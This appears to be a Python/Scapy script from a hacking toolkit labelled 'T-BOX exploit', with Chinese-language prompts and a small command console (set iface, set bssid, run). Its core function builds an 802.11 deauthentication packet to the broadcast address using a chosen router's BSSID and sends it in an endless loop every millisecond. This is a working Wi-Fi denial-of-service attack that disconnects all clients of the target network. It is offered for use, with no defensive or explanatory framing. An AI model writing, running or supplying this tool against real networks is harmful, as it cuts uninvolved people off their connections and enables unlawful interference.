import time
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *

print('                                                        ')
print('[Warning]请确保你的网卡已经开启监听或者混杂,负责将无法使用!')
print('                                                      ')
print('[Warning]你可以用 "aircrack-ng" 这个工具非常方便的获取路由器MAC以及目标MAC,详情请见www.baidu.com')
print('                                                                                           ')

interface = 'None'
timeout = 0.001
bssid = 'None'

def send_deauth(bssid,iface):
    dest = 'ff:ff:ff:ff:ff:ff'
    pkt = RadioTap()/Dot11(subtype=0xc,addr1=dest,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=3)
    while True:
        print('send deauth to '+ dest)
        sendp(pkt,iface=interface)
        time.sleep(timeout)

while True:
    cmd = input('T-BOX exploit(wifi/find-wifi) >')
    if cmd == 'show options':
        print('                                                          ')
        print('----------name---------content------------present---------')
        print('          iface           ' + interface + '             网卡名称    ')
        print('          bssid            '+bssid         +'            目标MAC                ')
        print('                                                                     ')
    
    elif cmd[:10] == 'set iface ':
        interface = cmd[10:]
        print('[*]iface ==> '+interface)

    elif cmd[:10] == 'set bssid ':
        bssid = cmd[10:]
        print('[*]bissid ==> '+bssid)

    elif cmd == '':    
            pass

    elif cmd == 'run':
        if interface == 'None' or bssid == 'None':
            print('[-]请设置网卡名称,或者目标MAC')
        else:
            send_deauth(bssid=bssid,iface=interface)
    
    elif cmd == 'back':
        break
    
    else:
        print("[-]can't find command: " + cmd)